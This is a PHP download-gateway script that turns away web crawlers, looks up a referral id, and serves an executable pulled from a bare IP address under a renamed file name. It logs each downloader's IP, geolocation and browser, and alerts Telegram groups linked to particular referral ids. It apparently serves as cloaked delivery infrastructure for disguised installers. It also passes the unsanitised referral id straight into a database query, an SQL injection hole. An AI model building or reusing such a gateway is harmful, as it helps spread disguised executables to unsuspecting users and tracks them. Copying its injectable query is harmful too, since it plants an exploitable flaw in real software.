<?php 

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

header('Content-Type: text/html; charset=utf-8');

require_once "db.php";
require_once "const.php";
require_once "functions.php";
require_once 'FileDownloadClass.php';

/*
** CRAWLER DETECT
*/
$crawler = crawlerDetect($_SERVER['HTTP_USER_AGENT']);
 
if ($crawler)
{
   die($crawler . ' detected.');
}


$ip      = client_ip();
$ref_id  = (isset($_GET["ref"])) 
    ? $_GET["ref"] 
    : ((isset($_GET["dist"])) ? $_GET["dist"] : NULL);


if (!!$ref_id)
{
    $ref = $ndb->referral()->where("id = '$ref_id'")->limit(1)->fetch();

    if (!$ref) 
        die("Ref {$ref_id} not found.");

    $dist = $ref->distribuition;

} else die("Ref is null. ". time());


if (!!$dist)
{
    /*
    **  DOWNLOAD FILE
    */
    //$fileName = dirname( dirname(__FILE__) )."/download/" . "sender_".$dist['id']."_install.exe";
    $downBase = "http://18.218.232.156/protect/download/";
    $fileName = $downBase . "sender_".$dist['id']."_install.exe";
    $distName = str_replace(' ', '_', $dist["name"]);
    $downName = $distName."_install.exe";




    /*
    **  GEO IP
    */
    $geo         = ip_to_geo($ip);
    $geo_city    = is_null($geo->city)         ? "Unknown"          : $geo->city;
    $geo_region  = is_null($geo->region_code)  ? $geo->region_name  : $geo->region_code ;
    $geo_country = is_null($geo->country_code) ? $geo->country_name : $geo->country_code;



    /*
    ** SAVE IP REF 
    */
    $ndb->downloads->insert(
        array(
            'ip' => $ip,
            'usr_id' => $ref['usr_id'],
            'geo' => json_encode($geo),
            'agent' => $_SERVER['HTTP_USER_AGENT'],
            'cfrom' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : NULL,
        )
    );



    /*
    **  NOTIFICATION
    */
    $text  = "📥 NNew download $downName";
    $text .= " from {$ip}, {$geo_city}, {$geo_region}, {$geo_country}.";

    if (isset($ref->usr))
    {
        $text .= "\nRef: ".$ref->usr['name'];
    }
    
    AddSMS(TELEGRAM_TSGROUP, $text);

    if ($ref->distribuition['id'] == "VJR901") 
    {
        AddSMS(TELEGRAM_LELO, $text);
    }

    if ($ref->distribuition['id'] == "FID901") 
    {
        addSMS(TELEGRAM_FIDCASH, $text);
        AddSMS(TELEGRAM_LELO, $text);
    }
            
    if ($ref->distribuition['id'] == "FID105") 
    {
        addSMS(TELEGRAM_FIDCASH, $text);
        AddSMS(TELEGRAM_LELO, $text);
    }
            

    
    $fileDownload = FileDownload::createFromFilePath($fileName);
    $fileDownload->sendDownload($downName);
    
    //echo $text;



} else {
    echo "ops!";
}

